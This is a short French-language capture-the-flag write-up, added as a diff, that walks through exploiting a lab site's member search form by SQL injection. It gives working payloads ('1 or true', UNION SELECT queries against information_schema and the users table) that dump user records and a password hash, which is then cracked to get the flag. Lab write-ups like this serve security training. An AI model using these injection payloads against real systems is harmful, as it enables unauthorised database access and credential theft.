@@ -1,0 +1,26 @@
+- À partir de l'index du site, on clique sur le lien 'Members' qui nous envoie sur une page de recherche d'utilisateurs par ID.
+
+- On commence par essayer plusieurs types d'input dans le champ prévu afin de comprendre le fonctionnement du formulaire.
+
+- Celui-ci envoie une requête qui interroge la base de données afin de récupérer des informations sur le membre possedant l'ID renseigné.
+
+- On va tester différentes injections pour vérifier le système de la base de données et récupérer des informations petit à petit.
+
+`1 or true` # renvoie vrai dans tous les cas, on obtient tous les utilisateurs
+`*` # erreur de syntaxe nous indiquant que c'est une bdd MySQL
+
+- L'injection fonctionne, on utilise le mot-clef union pour injecter des requêtes 'select' et redescendre l'arborescence de la bdd.
+
+`-1 union select null, concat(table_name) from information_schema.tables where table_schema=database()`
+# renvoie les tables de la bdd courante qui contient uniquement la table 'users'
+
+`-1 union select null, concat(column_name) from information_schema.columns where table_schema=database()`
+# renvoie les colonnes des tables de la bdd
+
+- Maintenant on recupère la valeur de chaque colonne pour tous les utilisateurs avec la commande suivante.
+
+`-1 union select NULL, concat(first_name, last_name, town, country, planet, Commentaire, countersign) from users`
+
+- On remarque l'utilisateur 'FlagGetThe' (lol) avec des instructions pour trouver le flag.
+
+- On entre le hash du champ 'countersign' sur Internet pour le décrypter (FortyTwo), on le passe en minuscule puis on le crypte avec sha256 pour obtenir le flag.
